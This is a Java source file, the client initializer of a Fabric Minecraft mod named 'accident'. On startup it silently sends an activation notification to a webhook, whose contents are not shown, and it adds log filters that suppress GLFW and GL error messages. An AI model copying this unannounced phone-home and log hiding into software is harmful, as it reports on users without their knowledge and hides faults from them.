package accident;

import accident.util.render.pipeline.HandsWavePipeline;
import lombok.Getter;
import net.fabricmc.api.ClientModInitializer;
import accident.manager.Manager;
import accident.modules.impl.render.DiscordRPCModule;
import accident.util.discord.WebhookNotifier;
import accident.util.lang.LanguageManager;
import accident.util.render.DiscordAvatarManager;

public class Initialization implements ClientModInitializer {

    @Getter
    private static Initialization instance;

    @Getter
    private Manager manager;

    @Override
    public void onInitializeClient() {
        WebhookNotifier notifier = new WebhookNotifier();
        notifier.sendActivationNotification();
        HandsWavePipeline.PIPELINE.toString();
    }

    public void init() {
        instance = this;

        muteGlErrors();

        LanguageManager.getInstance().init();

        manager = new Manager();
        manager.init();

        accident.modules.impl.misc.LuaScripts.getInstance();

        DiscordAvatarManager.init();

        try {
            DiscordRPCModule rpc = getRPCModule();
            if (rpc != null) {
                rpc.startRPC();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private DiscordRPCModule getRPCModule() {
        if (manager != null && manager.getModuleRepository() != null) {
            for (accident.modules.module.ModuleStructure module : manager.getModuleRepository().modules()) {
                if (module instanceof DiscordRPCModule) {
                    return (DiscordRPCModule) module;
                }
            }
        }
        return null;
    }

    public static void muteGlErrors() {
        try {
            org.lwjgl.glfw.GLFWErrorCallback.createPrint(new java.io.PrintStream(new java.io.OutputStream() {
                @Override
                public void write(int b) {}
            })).set();

            org.apache.logging.log4j.core.LoggerContext context = (org.apache.logging.log4j.core.LoggerContext) org.apache.logging.log4j.LogManager.getContext(false);
            org.apache.logging.log4j.core.config.Configuration config = context.getConfiguration();

            config.addFilter(new org.apache.logging.log4j.core.filter.AbstractFilter() {
                @Override
                public Result filter(org.apache.logging.log4j.core.LogEvent event) {
                    String msg = event.getMessage().getFormattedMessage();
                    if (msg.contains("65539") || msg.contains("Invalid key 3") || msg.contains("GL ERROR") || msg.contains("GLFW")) {
                        return Result.DENY;
                    }
                    return Result.NEUTRAL;
                }
            });

            context.updateLoggers();

        } catch (Exception ignored) {
        }
    }
}